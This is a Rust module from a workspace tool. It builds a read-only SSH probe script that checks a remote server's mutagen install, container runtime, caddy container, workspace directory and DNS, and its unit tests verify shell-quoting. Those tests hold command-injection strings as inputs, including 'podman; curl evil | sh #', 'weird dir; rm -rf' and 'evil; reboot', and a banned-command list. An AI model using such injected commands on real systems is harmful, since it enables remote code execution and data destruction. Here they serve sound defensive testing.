//! Read-only readiness probes: never install, mutate, or `sudo` — only observe over the user's SSH.

use crate::remote;

pub struct Probe {
    pub name: &'static str,
    pub ok: bool,
    pub detail: String,
    pub cmd: Option<String>,
}

impl Probe {
    fn new(name: &'static str, ok: bool, detail: impl Into<String>, cmd: impl Into<String>) -> Self {
        Probe { name, ok, detail: detail.into(), cmd: Some(cmd.into()) }
    }
    /// Server-side check whose command isn't shown per-line; the batched script is displayed once.
    fn server(name: &'static str, ok: bool, detail: impl Into<String>) -> Self {
        Probe { name, ok, detail: detail.into(), cmd: None }
    }
}

/// Reachability line built from a known verdict, so callers avoid a second SSH handshake just to test it.
pub fn ssh_status(connection: &str, ok: bool) -> Probe {
    Probe::new(
        "ssh",
        ok,
        if ok {
            format!("reachable — {connection}")
        } else {
            format!("cannot open an SSH session to {connection} (host / key / Tailscale?)")
        },
        format!("ssh -o BatchMode=yes {connection} true"),
    )
}

/// Standalone SSH-reachability check for callers that do no server probing (e.g. `ws init --remote`).
pub fn ssh_reachable(connection: &str) -> Probe {
    ssh_status(connection, remote::reachable(connection))
}

pub fn mutagen_local() -> Probe {
    let ok = crate::mutagen::installed();
    Probe::new(
        "mutagen",
        ok,
        if ok { "installed locally" } else { "not on PATH — needed to sync a remote workspace" },
        "mutagen version",
    )
}

/// Kept beside the script so the reported keys and the checks can't drift.
const SERVER_CHECKS: &[(&str, &str)] = &[
    ("mutagen", "mutagen present on the server"),
    ("caddy", "the ws-caddy container is running"),
    ("workspace", "the workspace dir exists and is writable"),
];

/// Kept out of `SERVER_CHECKS` because its detail names the runtime, which isn't known until config is read.
const RUNTIME_CHECK: &str = "runtime";

/// Kept out of `SERVER_CHECKS` because without a `domain` there is nothing to resolve and the check would always pass.
const DNS_CHECK: &str = "dns";

/// Fixed synthetic label matching `server-setup/debian.sh` so both agree on what "wired" means.
const DNS_PROBE_LABEL: &str = "ws-probe";

/// Failure text names what didn't resolve, why it matters, and where the fix lives — the whole value of this probe.
fn dns_detail(domain: &str, ok: bool) -> String {
    if ok {
        format!("the server resolves *.{domain} to itself")
    } else {
        format!(
            "can't resolve {DNS_PROBE_LABEL}.{domain} on the server — a `kind: host` repo \
             there can't reach a routed container (re-run server-setup/debian.sh; a DHCP \
             renewal can overwrite /etc/resolv.conf)"
        )
    }
}

/// One round-trip, read-only script printing `<key>:<ok|fail>` lines; `runtime` is the configured runtime so we don't probe a binary the server was never meant to have.
pub fn server_script(workspace_path: &str, runtime: &str, domain: Option<&str>) -> String {
    let wp = remote::shell_quote(workspace_path);
    // `runtime` comes from a possibly-cloned `.ws.json` and runs in the server's shell.
    let rt = remote::shell_quote(runtime);
    let mut lines = vec![
        "command -v mutagen >/dev/null 2>&1 && echo mutagen:ok || echo mutagen:fail".to_string(),
        format!("{rt} info >/dev/null 2>&1 && echo {RUNTIME_CHECK}:ok || echo {RUNTIME_CHECK}:fail"),
        // Anchor `-f name=` (`^…$`) or a stray `ws-caddy-old` would make a stopped ws-caddy read as up.
        format!("{rt} ps -q -f name='^ws-caddy$' -f status=running | grep -q . && echo caddy:ok || echo caddy:fail"),
        format!("test -d {wp} && test -w {wp} && echo workspace:ok || echo workspace:fail"),
    ];
    if let Some(d) = domain {
        // `getent hosts` asks the resolver stack a dev server would ask, not dnsmasq directly which answers fine even when nothing points at it.
        let host = remote::shell_quote(&format!("{DNS_PROBE_LABEL}.{d}"));
        lines.push(format!(
            "getent hosts {host} >/dev/null 2>&1 && echo {DNS_CHECK}:ok || echo {DNS_CHECK}:fail"
        ));
    }
    lines.join("; ")
}

/// Returns `None` when SSH itself couldn't reach the server so the caller reports "unreachable" instead of a wall of failures.
pub fn server_probes(
    connection: &str,
    workspace_path: &str,
    runtime: &str,
    domain: Option<&str>,
) -> Option<Vec<Probe>> {
    let script = server_script(workspace_path, runtime, domain);
    let out = remote::ssh_capture(connection, &script)?;
    let results = parse_server(&out);
    // A missing key (older server, partial run) reads as failure, not a silent pass.
    let verdict = |key: &str| results.get(key).copied().unwrap_or(false);
    let mut probes: Vec<Probe> = SERVER_CHECKS
        .iter()
        .map(|(key, desc)| Probe::server(key, verdict(key), *desc))
        .collect();
    // After `mutagen`, before `caddy` — the setup order, which is also how failures cascade.
    probes.insert(
        1,
        Probe::server(RUNTIME_CHECK, verdict(RUNTIME_CHECK), format!("{runtime} is up on the server")),
    );
    if let Some(d) = domain {
        let ok = verdict(DNS_CHECK);
        probes.push(Probe::server(DNS_CHECK, ok, dns_detail(d, ok)));
    }
    Some(probes)
}

fn parse_server(stdout: &str) -> std::collections::BTreeMap<String, bool> {
    stdout
        .lines()
        .filter_map(|l| l.split_once(':').map(|(k, v)| (k.trim().to_string(), v.trim() == "ok")))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn assert_read_only(s: &str) {
        for banned in ["sudo", "rm ", "install", "systemctl start", "podman run", "create"] {
            assert!(!s.contains(banned), "server script must stay read-only, found {banned:?}: {s}");
        }
    }

    #[test]
    fn server_script_is_read_only_and_covers_every_check() {
        let s = server_script("workspace", "podman", None);
        assert_read_only(&s);
        for (key, _) in SERVER_CHECKS {
            assert!(s.contains(&format!("echo {key}:ok")), "missing probe for {key}: {s}");
        }
        assert!(s.contains(&format!("echo {RUNTIME_CHECK}:ok")), "missing runtime probe: {s}");
    }

    /// The old script asked `podman` regardless of config, reporting an unactionable failure while the real runtime went unchecked.
    #[test]
    fn server_script_probes_the_configured_runtime() {
        let s = server_script("workspace", "docker", None);
        assert!(s.contains("docker info"), "runtime liveness must use the configured runtime: {s}");
        assert!(s.contains("docker ps -q"), "the caddy check must use it too: {s}");
        assert!(!s.contains("podman"), "no hardcoded podman may survive: {s}");
    }

    #[test]
    fn server_script_quotes_a_hostile_runtime() {
        let s = server_script("workspace", "podman; curl evil | sh #", None);
        assert!(s.contains("'podman; curl evil | sh #' info"), "runtime must be shell-quoted: {s}");
    }

    #[test]
    fn server_script_quotes_the_workspace_path() {
        let s = server_script("weird dir; rm -rf", "podman", None);
        assert!(s.contains("'weird dir; rm -rf'"), "workspace path must be shell-quoted: {s}");
    }

    #[test]
    fn server_script_probes_dns_only_with_a_domain() {
        let without = server_script("workspace", "podman", None);
        assert!(!without.contains("dns:"), "no domain must mean no DNS check at all: {without}");

        let with = server_script("workspace", "podman", Some("myapp.test"));
        assert!(with.contains("getent hosts ws-probe.myapp.test"), "expected the wildcard lookup: {with}");
        assert!(with.contains("echo dns:ok"), "expected the dns key: {with}");
        assert!(with.contains("echo dns:fail"), "expected the dns failure branch: {with}");
        assert_read_only(&with);
    }

    #[test]
    fn server_script_quotes_the_domain() {
        let s = server_script("workspace", "podman", Some("evil; reboot"));
        assert!(s.contains("'ws-probe.evil; reboot'"), "the probe host must be shell-quoted: {s}");
    }

    #[test]
    fn dns_detail_names_the_host_and_the_fix() {
        let ok = dns_detail("myapp.test", true);
        assert!(ok.contains("*.myapp.test"), "pass line should name the domain: {ok}");

        let bad = dns_detail("myapp.test", false);
        assert!(bad.contains("ws-probe.myapp.test"), "failure must name what didn't resolve: {bad}");
        assert!(bad.contains("server-setup/debian.sh"), "failure must point at the fix: {bad}");
        assert!(bad.contains("resolv.conf"), "failure should name the usual cause: {bad}");
    }

    #[test]
    fn parse_server_reads_ok_and_fail() {
        let m = parse_server("mutagen:ok\nruntime:fail\ncaddy:ok\n");
        assert_eq!(m.get("mutagen"), Some(&true));
        assert_eq!(m.get(RUNTIME_CHECK), Some(&false));
        assert_eq!(m.get("caddy"), Some(&true));
        assert_eq!(m.get("workspace"), None);
    }

    #[test]
    fn server_probes_default_a_missing_key_to_fail() {
        let results = parse_server("mutagen:ok\nruntime:ok\n");
        let workspace_ok = results.get("workspace").copied().unwrap_or(false);
        assert!(!workspace_ok, "a key absent from the server output must read as a failure");
    }
}
